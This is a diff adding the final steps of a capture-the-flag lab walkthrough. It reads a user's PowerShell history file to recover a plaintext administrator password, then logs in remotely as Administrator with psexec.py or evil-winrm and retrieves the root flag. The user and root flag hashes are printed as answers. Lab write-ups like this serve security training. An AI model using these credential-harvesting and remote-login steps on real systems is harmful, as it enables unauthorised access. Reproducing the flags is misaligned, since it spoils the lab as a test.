@@ -110,4 +110,45 @@ In this part we can get the user flag: 3e7b102e78218e935bf3f4951fec21a3
    ```
 
    It shows the PowerShell history path.
+
+10. Read PowerShell history to extract admin credentials.
+    
+    ```bash
+    type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+    ```
+
+   We got the password,
    
+   $secpasswd = ConvertTo-SecureString 'MEGACORP_4dm1n!!' -AsPlainText -Force
+   
+11.  Login as Administrator
+
+     We use impacket pasexec.py:
+
+     ```bash
+     python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.129.10.155
+     ```
+
+     or use the Evil-WinRm:
+
+    ```bash
+    evil-winrm -i 10.129.10.155 -u Administrator -p 'MEGACORP_4dm1n!!'
+    ```
+
+    After this, we can read the root flag:
+
+    ```bash
+    cd C:\Users\Administrator\Desktop
+    type root.txt
+    ```
+
+    Get the root flag: b91ccec3305e98240082d4474b848528.
+
+## Task 2
+
+### 🛠️The process of solving task2
+
+
+
+     
+    
